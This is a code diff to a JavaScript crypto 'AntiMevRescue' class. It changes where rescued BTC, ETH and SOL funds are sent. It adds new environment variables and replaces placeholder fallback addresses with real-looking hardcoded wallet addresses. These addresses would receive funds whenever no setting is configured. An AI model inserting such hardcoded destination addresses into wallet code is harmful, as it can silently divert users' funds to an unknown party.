@@ -26,15 +26,15 @@ class AntiMevRescue {
   getVaultDestination(chain = 'BTC') {
     const normChain = chain.toUpperCase();
     if (normChain === 'BTC') {
-      return process.env.RESCUE_VAULT_BTC_ADDRESS || 'bc1q9v837m973zfv489t624t44z9494zz94q94zz94';
+      return process.env.COLD_VAULT_BTC || process.env.RESCUE_VAULT_BTC_ADDRESS || 'bc1q4ea075c0ypxuw7w28j5cl8k7l6ga7qzsaxda56';
     }
     if (normChain === 'ETH') {
-      return process.env.RESCUE_VAULT_ETH_ADDRESS || '0x71C8366420A092679b545384551585D72ced867f';
+      return process.env.COLD_VAULT_ETH || process.env.RESCUE_VAULT_ETH_ADDRESS || '0xf5f3e4750c1bFa26677daD29FcdeaD6f71A742e0';
     }
     if (normChain === 'SOL') {
-      return process.env.RESCUE_VAULT_SOL_ADDRESS || 'SOL99999999999999999999999999999999999999999';
+      return process.env.COLD_VAULT_SOL || process.env.RESCUE_VAULT_SOL_ADDRESS || 'FBx2SKLDLsdeLM8owxU8MNVPKAfJpLpmpHHRgiZDqBoi';
     }
-    return process.env.RESCUE_VAULT_BTC_ADDRESS || 'bc1q9v837m973zfv489t624t44z9494zz94q94zz94';
+    return process.env.COLD_VAULT_BTC || process.env.RESCUE_VAULT_BTC_ADDRESS || 'bc1q4ea075c0ypxuw7w28j5cl8k7l6ga7qzsaxda56';
   }
 
   /**
